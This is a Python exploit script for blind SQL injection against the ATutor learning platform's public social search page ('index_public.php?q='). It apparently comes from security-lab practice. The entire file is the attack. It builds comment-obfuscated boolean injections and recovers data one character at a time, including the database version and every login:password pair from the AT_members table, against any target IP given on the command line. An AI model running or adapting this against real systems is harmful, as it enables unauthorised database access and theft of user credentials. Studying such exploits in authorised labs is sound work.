import sys
import requests

def searchFriends(ip, injStr):
	for i in range(32, 126):
		target = "http://%s/atutor/mods/_standard/social/index_public.php?q=%s" % (ip, injStr.replace("[CHAR]", str(i)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if(content_length > 20):
			return i
	return None


def count(column, ip):
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((select/**/count(%s)/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % (column,i)
		try:
			counted = chr(searchFriends(ip, injectStr))
		except:
			break
	return counted


def inject(inj, ip):
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (inj,i)
		try:
			extractedChar = chr(searchFriends(ip, injectStr))
			sys.stdout.write(extractedChar)
			sys.stdout.flush()
		except:
			break


def main():
	ip = sys.argv[1]

	if len(sys.argv) != 2:
		print("[!] Usage: python3 %s <target>" % sys.argv[0])
		print("ex: python3 %s 192.168.0.1" % sys.argv[0])
		sys.exit(-1)

	print("\n[+] Database version")
	query = "select/**/version()"
	dbVersion = inject(query, ip)

	print("\n\n[+] Retrieving credentials...")
	usercount = int(count("login", ip))
	for i in range(0,usercount):
		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
		username = inject(query, ip)
		print("")


if __name__ == "__main__":
	main()
